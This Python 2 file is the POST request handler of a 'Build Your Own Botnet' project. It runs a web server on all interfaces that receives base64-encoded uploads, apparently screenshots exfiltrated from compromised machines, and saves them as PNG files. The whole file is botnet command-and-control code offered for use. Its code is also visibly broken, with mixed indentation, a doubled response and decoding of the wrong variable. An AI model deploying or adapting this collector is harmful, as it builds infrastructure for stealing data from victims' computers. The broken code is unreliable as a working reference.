#!/usr/bin/python
'Post Request Handler (Build Your Own Botnet)'

# standard library
import sys
import json
import string
import base64
import random
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

# utilities
import util


class Handler(BaseHTTPRequestHandler):

	def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

	def do_POST(self):
        self._set_headers()
        self.data_string = self.rfile.read(int(self.headers['Content-Length']))
        self.send_response(200)
        self.end_headers()
        data = json.loads(self.data_string).get('data')
        fname = 'data/{}.png'.format(str().join([random.choice(string.lowercase + string.digits) for _ in range(3)]))
        with file(fname, 'wb') as fp:
        	data = util.png(base64.b64decode(self.data_string))
        	fp.write(data)


def run(server_class=HTTPServer, handler_class=Handler, port=80):
	httpd = server_class(('0.0.0.0', port), handler_class)
	httpd.serve_forever()


def main():
	if len(sys.argv) == 2 and sys.argv[1].isdigit():
		port = int(sys.argv[1])
		run(port=port)

if __name__ == '__main__':
	main()

